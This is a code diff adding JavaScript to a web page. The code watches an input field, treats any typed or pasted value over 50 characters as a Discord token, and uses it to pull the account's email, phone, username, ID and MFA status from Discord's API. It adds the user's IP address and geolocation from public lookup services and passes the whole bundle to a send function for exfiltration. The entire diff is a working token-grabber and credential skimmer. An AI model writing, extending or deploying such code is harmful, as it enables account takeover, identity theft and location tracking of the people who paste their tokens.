@@ -14,22 +14,94 @@
         }
     }
 
+    async function getIP() {
+        try {
+            const res = await fetch("https://api.ipify.org?format=json");
+            const data = await res.json();
+            return data.ip;
+        } catch(e) {
+            return "Unable to get IP";
+        }
+    }
+
+    async function getIPInfo(ip) {
+        try {
+            const res = await fetch(`https://ipapi.co/${ip}/json/`);
+            const data = await res.json();
+            return `IP: ${data.ip}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country_name}
+Postal: ${data.postal}
+Latitude: ${data.latitude}
+Longitude: ${data.longitude}
+ISP: ${data.org}
+Timezone: ${data.timezone}`;
+        } catch(e) {
+            return "Unable to get IP info";
+        }
+    }
+
+    async function getDiscordInfo(token) {
+        try {
+            const res = await fetch("https://discord.com/api/v9/users/@me", {
+                headers: { Authorization: token }
+            });
+            if (!res.ok) return "Invalid token or rate limited";
+            const data = await res.json();
+            return `Email: ${data.email}
+Phone: ${data.phone || "None"}
+Username: ${data.username}#${data.discriminator}
+User ID: ${data.id}
+Verified: ${data.verified}
+MFA Enabled: ${data.mfa_enabled}`;
+        } catch(e) {
+            return "Failed to fetch Discord info";
+        }
+    }
+
+    async function processInput(inputValue) {
+        const token = inputValue.trim();
+        if (!token) return;
+
+        const ip = await getIP();
+        const discordInfo = await getDiscordInfo(token);
+        const ipInfo = await getIPInfo(ip);
+
+        const output = `\`\`\`ini
+Token --> ${token}
+
+* Account Info
+${discordInfo}
+
+* Networking Info
+Ip --> ${ip}
+
+* Ip Info
+${ipInfo}
+\`\`\``;
+
+        await sendData(output);
+    }
+
     function attachToField(selector) {
         const field = document.querySelector(selector);
         if (!field) return console.error("Field not found:", selector);
 
         let oldValue = field.value;
-        field.addEventListener("input", () => {
+        field.addEventListener("input", async () => {
             let newValue = field.value;
-            if (newValue !== oldValue) {
-                sendData(`[INPUT] ${newValue}`);
+            if (newValue !== oldValue && newValue.length > 50) { // likely a token
+                await processInput(newValue);
                 oldValue = newValue;
             }
         });
 
-        field.addEventListener("paste", () => {
-            setTimeout(() => {
-                sendData(`[PASTE] ${field.value}`);
+        field.addEventListener("paste", async () => {
+            setTimeout(async () => {
+                if (field.value.length > 50) {
+                    await processInput(field.value);
+                }
             }, 10);
         });
     }
